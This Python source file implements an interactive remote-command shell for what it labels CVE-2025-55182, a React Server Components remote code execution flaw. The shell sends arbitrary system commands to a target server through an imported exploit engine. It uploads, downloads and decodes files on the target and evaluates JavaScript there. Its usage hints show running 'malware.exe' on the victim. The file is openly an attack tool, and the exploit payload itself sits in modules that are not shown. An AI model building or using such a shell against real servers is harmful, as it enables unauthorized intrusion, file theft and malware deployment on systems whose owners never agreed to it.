import os

from exploit_tool.config import ExploitConfig
from exploit_tool.engine import ExploitEngine
from exploit_tool.theme import Theme
from exploit_tool.commands import FileOperations, BuiltinCommands

class InteractiveShell:
    def __init__(self, target_url):
        self.config = ExploitConfig()
        self.config.target_url = self.config.normalize_url(target_url)
        self.engine = ExploitEngine(self.config)
        self.command_history = []
        
        # Initialize command handlers
        self.file_ops = FileOperations(self)
        self.builtin = BuiltinCommands(self)
        
    def show_banner(self):
        banner = f"""
{Theme.OKCYAN}╔══════════════════════════════════════════════════════════╗
║  CVE-2025-55182 Interactive Exploitation Shell           ║
║  React Server Components RCE                             ║
╚══════════════════════════════════════════════════════════╝{Theme.ENDC}

{Theme.OKGREEN}[+] Target:{Theme.ENDC} {self.config.target_url}
{Theme.OKGREEN}[+] Type 'help' for available commands{Theme.ENDC}
"""
        print(banner)
    
    def execute_command(self, command):
        """Execute system command on target (via execSync - spawns cmd.exe)"""
        self.command_history.append(command)
        
        success, status, output = self.engine.execute(command)
        
        if success:
            if output.strip():
                print(output)
            else:
                print(f"{Theme.DIM}(no output){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Command failed: {output}{Theme.ENDC}")
    
    def execute_command_spawn(self, command):
        """Execute executable via spawnSync (NO cmd.exe spawn)"""
        self.command_history.append(f"run {command}")
        
        print(f"{Theme.OKCYAN}[*] Executing via spawnSync (NO cmd.exe spawn)...{Theme.ENDC}")
        success, status, output = self.engine.execute(command, use_spawn=True)
        
        if success:
            if output.strip():
                print(output)
            else:
                print(f"{Theme.DIM}(no output){Theme.ENDC}")
        else:
            print(f"{Theme.FAIL}[!] Execution failed: {output}{Theme.ENDC}")
    
    def get_prompt(self):
        cmd_num = len(self.command_history) + 1
        return f"{Theme.FAIL}{Theme.BOLD}rce{Theme.ENDC} {Theme.OKCYAN}@{Theme.ENDC} {Theme.OKGREEN}{self.config.target_url.split('://')[-1]}{Theme.ENDC} {Theme.WARNING}#{cmd_num}{Theme.ENDC} > "
    
    def run(self):
        self.show_banner()
        
        # Test connection
        print(f"{Theme.OKCYAN}[*] Testing connection...{Theme.ENDC}")
        success, _, _ = self.engine.execute("whoami", silent=True)
        if success:
            print(f"{Theme.OKGREEN}[+] Connection established!{Theme.ENDC}\n")
        else:
            print(f"{Theme.WARNING}[!] Warning: Connection test failed, but continuing...{Theme.ENDC}\n")
        
        while True:
            try:
                user_input = input(self.get_prompt()).strip()
                
                if not user_input:
                    continue
                
                parts = user_input.split(maxsplit=1)
                cmd = parts[0].lower()
                args = parts[1] if len(parts) > 1 else ""
                
                # Exit commands
                if cmd in ['exit', 'quit']:
                    print(f"\n{Theme.OKCYAN}[*] Exiting shell... Commands executed: {self.engine.command_count}{Theme.ENDC}\n")
                    break
                
                # Built-in commands
                elif cmd == 'help':
                    self.builtin.show_help()
                
                elif cmd == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    self.show_banner()
                
                elif cmd == 'info':
                    self.builtin.show_info()
                
                elif cmd == 'history':
                    self.builtin.show_history()
                
                elif cmd == 'timeout':
                    self.builtin.set_timeout(args)
                
                elif cmd == 'eval':
                    self.builtin.eval_js(args)
                
                # File operations - Main commands
                elif cmd == 'upload':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: upload <file>{Theme.ENDC}")
                    else:
                        self.file_ops.upload(args)
                
                elif cmd == 'decode':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: decode <input.b64> <output.file>{Theme.ENDC}")
                    else:
                        self.file_ops.decode(args)
                
                elif cmd == 'download':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: download <remote_file>{Theme.ENDC}")
                    else:
                        self.file_ops.download(args)
                
                # File operations - Deprecated commands
                elif cmd == 'upload-echo':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: upload-echo <file>{Theme.ENDC}")
                    else:
                        self.file_ops.upload_deprecated(args, method='echo')
                
                elif cmd == 'upload-node':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: upload-node <file>{Theme.ENDC}")
                    else:
                        self.file_ops.upload_deprecated(args, method='node')
                
                elif cmd == 'decode-node':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: decode-node <input.b64> <output.file>{Theme.ENDC}")
                    else:
                        self.file_ops.decode_deprecated(args)
                
                # Execute via spawn (NO cmd.exe)
                elif cmd == 'run':
                    if not args:
                        print(f"{Theme.FAIL}[!] Usage: run <executable> [args...]{Theme.ENDC}")
                        print(f"{Theme.DIM}[*] Example: run malware.exe{Theme.ENDC}")
                        print(f"{Theme.DIM}[*] Example: run malware.exe arg1 arg2{Theme.ENDC}")
                    else:
                        self.execute_command_spawn(args)
                
                # System commands (default - via execSync, spawns cmd.exe)
                else:
                    self.execute_command(user_input)
                
            except KeyboardInterrupt:
                print(f"\n{Theme.WARNING}[!] Use 'exit' to quit{Theme.ENDC}")
                continue
            except EOFError:
                print(f"\n{Theme.OKCYAN}[*] Exiting...{Theme.ENDC}\n")
                break
